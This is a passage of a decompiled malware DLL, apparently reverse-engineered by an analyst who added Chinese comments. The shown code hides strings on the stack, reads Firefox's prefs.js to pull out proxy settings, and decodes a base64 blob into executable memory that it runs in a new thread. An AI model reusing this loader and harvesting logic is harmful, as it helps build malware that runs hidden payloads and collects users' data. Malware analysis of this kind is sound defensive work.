  v36 = 0x69;
  v37 = 0x6E;
  v39 = 0;
  v38 = 0x69;
  v42 = 0x5C;
  v45 = 0x5C;
  v48 = 0x5C;
  v51 = 0;
  v40 = 0x25;                                   // %s\%s\%s\%s
  v41 = 0x73;
  v43 = 0x25;
  v44 = 0x73;
  v46 = 0x25;
  v47 = 0x73;
  v49 = 0x25;
  v50 = 0x73;
  wsprintfW(v2, &v40, v1, &v75, &v83, &v27);
  v62 = 0x72;                                   // v75"Mozilla"
                                                // v83"Firefox"
                                                // v27"profiles.ini"
  v63 = 0x6F;
  v64 = 0x66;
  v65 = 0x69;
  v67 = 0x65;
  v68 = 0x30;
  v69 = 0;
  v71 = 0x61;
  v72 = 0x74;
  v73 = 0x68;
  AppName = 0x50;
  v66 = 0x6C;
  KeyName = 0x50;
  v74 = 0;
  v3 = (WCHAR *)bj_sub_10003F3C_alloc(0x208u);
  GetPrivateProfileStringW(&AppName, &KeyName, &Default, v3, 0x104u, v2);
  bj_sub_10003F45_free(v2);
  v4 = bj_sub_10003336(v3, 0x2F);
  if ( v4 )
    v3[v4 - v3] = 0x5C;                         // 把'/'转换为'\'
  v52 = 0x70;                                   // v52 prefs.js
  v53 = 0x72;
  v54 = 0x65;
  v55 = 0x66;
  v57 = 0x2E;
  v58 = 0x6A;
  v60 = 0;
  v12 = 0x25;                                   // v12 %s\%s\%s\%s\%s
  v15 = 0x25;
  v18 = 0x25;
  v21 = 0x25;
  v24 = 0x25;
  v26 = 0;
  v56 = 0x73;
  v59 = 0x73;
  v13 = 0x73;
  v14 = 0x5C;
  v16 = 0x73;
  v17 = 0x5C;
  v19 = 0x73;
  v20 = 0x5C;
  v22 = 0x73;
  v23 = 0x5C;
  v25 = 0x73;
  wsprintfW(v1, &v12, v1, &v75, &v83, v3, &v52);// %APPDATA%\Mozilla\Firefox\%s\prefs.js
  bj_sub_10003F45_free(v3);
  v5 = 0;
  v6 = CreateFileW(v1, 0x80000000, 1u, 0, 3u, 0, 0);
  v7 = v6;
  if ( v6 != (HANDLE)-1 )
  {
    v8 = GetFileSize(v6, 0);
    NumberOfBytesRead = 0;
    v5 = bj_sub_10003F3C_alloc(v8);
    if ( !ReadFile(v7, v5, v8, &NumberOfBytesRead, 0) )// 就是找到上面那个文件,然后读取内容返回
    {
      bj_sub_10003F45_free(v5);
      v5 = 0;
    }
    CloseHandle(v7);
  }
  bj_sub_10003F45_free(lpMem);
  return v5;
}

//----- (10006C2F) --------------------------------------------------------
// 从firefox的prefs.js里面解析出用的proxyserver, proxyusername, proxypassword
CHAR *__stdcall bj_sub_10006C2F(char *a1)
{
  _BYTE *v1; // eax
  void *v2; // ebx
  char *v3; // eax
  char *v4; // eax
  _BYTE *v5; // esi
  _BYTE *v6; // eax
  int v7; // edi
  _BYTE *v8; // eax
  char *v9; // eax
  char *v10; // eax
  _BYTE *v11; // esi
  _BYTE *v12; // eax
  int v13; // ebx
  void *v14; // edi
  CHAR *v15; // esi
  void *lpMem; // [esp+4h] [ebp-10h]
  CHAR *v18; // [esp+8h] [ebp-Ch]
  void *v19; // [esp+Ch] [ebp-8h]
  _BYTE *v20; // [esp+10h] [ebp-4h]

  v18 = 0;
  v1 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000767C, 18);// network.proxy.http
  v2 = v1;
  v20 = v1;
  v3 = bj_sub_100032E2_strfind(a1, v1);
  if ( v3 )
  {
    v4 = bj_sub_100032E2_strfind(v3, &bj_unk_100076B0);// |, "|
    if ( v4 )
    {
      v5 = v4 + 3;
      v6 = bj_sub_100032C4_strfind(v4 + 3, 34);
      if ( v6 )
      {
        if ( v6 > v5 )
        {
          v7 = v6 - v5;
          v19 = bj_sub_10003F3C_alloc(v6 - v5 + 1);
          bj_sub_10003271_cpy((int)v19, v5, v7);
          v8 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007664, 23);// network.proxy.http_port
          lpMem = v8;
          v9 = bj_sub_100032E2_strfind(a1, v8);
          if ( v9 )
          {
            v10 = bj_sub_100032E2_strfind(v9, &unk_100076B4);// |, |
            if ( v10 )
            {
              v11 = v10 + 2;
              v12 = bj_sub_100032C4_strfind(v10 + 2, 0x29);// |)|
              if ( v12 && v12 > v11 )
              {
                v13 = v12 - v11;
                v14 = bj_sub_10003F3C_alloc(v12 - v11 + 1);
                bj_sub_10003271_cpy((int)v14, v11, v13);
                v15 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007690, 19);// https=https://%s:%s
                v18 = (CHAR *)bj_sub_10003F3C_alloc(0x104u);
                wsprintfA(v18, v15, v19, v14);
                bj_sub_10003F45_free(v15);
                bj_sub_10003F45_free(v14);
              }
              v2 = v20;
            }
          }
          bj_sub_10003F45_free(lpMem);
          bj_sub_10003F45_free(v19);
        }
      }
    }
  }
  bj_sub_10003F45_free(v2);
  return v18;
}

//----- (10006D69) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10006D69_setzero(_DWORD *this)
{
  *this = 0;
  return this;
}

//----- (10006D6F) --------------------------------------------------------
void __thiscall bj_sub_10003D76_setzero(_DWORD *this)
{
  *this = 0;
}

//----- (10006D73) --------------------------------------------------------
int __thiscall bj_sub_10006D73(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  if ( a2 )
    *this = a2;
  return result;
}

//----- (10006D83) --------------------------------------------------------
BOOL __thiscall bj_sub_10006D83_free(LPVOID *this)
{
  BOOL result; // eax

  if ( *this )
    result = VirtualFree(*this, 0, 0x8000u);
  return result;
}

//----- (10006D98) --------------------------------------------------------
void __thiscall bj_sub_10006D98(_DWORD *this, LPCSTR pszString, DWORD cchString)
{
  _DWORD *v3; // edi
  BYTE *v4; // esi
  LPVOID v5; // eax
  SIZE_T dwSize; // [esp+4h] [ebp-4h]

  v3 = this;
  if ( pszString )
  {
    if ( cchString )
    {
      dwSize = 0;
      v4 = bj_sub_10002EDE_base64crypt(pszString, cchString, &dwSize);
      if ( v4 )
      {
        if ( dwSize )
        {
          v5 = VirtualAlloc(0, dwSize, 0x3000u, 0x40u);// PAGE_EXECUTE_READWRITE
          *v3 = v5;
          if ( v5 )
            bj_sub_10003271_cpy((int)v5, v4, dwSize);
        }
      }
    }
  }
}

//----- (10006DFB) --------------------------------------------------------
// 创建线程执行,a2是错误码
char __thiscall bj_sub_10006DFB(LPTHREAD_START_ROUTINE *this, DWORD *a2)
{
  char v2; // bl
  HANDLE v3; // eax
  void *v4; // esi

  v2 = 0;
  if ( *this )
  {
    v2 = 1;
    v3 = CreateThread(0, 0, *this, 0, 0, 0);
    v4 = v3;
    if ( v3 )
    {
      WaitForSingleObject(v3, 0xFFFFFFFF);
      CloseHandle(v4);
    }
    else
    {
      *a2 = GetLastError();
    }
  }
  return v2;
}

//----- (10006E42) --------------------------------------------------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  if ( fdwReason == 1 )
    DisableThreadLibraryCalls(hinstDLL);
  return 1;
}

//----- (10006E5B) --------------------------------------------------------
BOOL secnt_1()
{
  HANDLE v0; // edi
  MSG Msg; // [esp+8h] [ebp-1Ch]

  v0 = CreateThread(0, 0, bj_sub_10002E33, 0, 0, 0);
  while ( GetMessageA(&Msg, 0, 0, 0) )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return CloseHandle(v0);
}

// ALL OK, 185 function(s) have been successfully decompiled
